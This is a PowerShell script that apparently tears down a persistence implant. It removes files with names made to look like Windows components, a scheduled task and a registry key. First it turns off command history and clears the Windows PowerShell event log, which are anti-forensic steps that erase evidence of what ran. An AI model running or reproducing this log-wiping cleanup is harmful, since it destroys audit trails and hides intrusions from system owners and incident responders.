$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$taskset = @("RegBackupVerifier")
$pathset = @("C:\Windows\System32\Registry.exe", "C:\Windows\System32\WindowsUpdateService.ps1", "C:\Windows\System32\SecureBootUpdatesMicrosoft")
$regpath = "HKLM:\Software\WindowsUpdateService"
# Directory Cleanup.
foreach ($directory in $pathset) {
    if (Test-Path $directory) {
        Remove-Item -Path $directory -Recurse -Confirm:$false 
	}
}

# Unregister the scheduled task
foreach ($task in $taskset) {
    Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
}

#Registry cleanup.
Get-Item $regpath | Remove-Item -Force -ErrorAction SilentlyContinue | Out-Null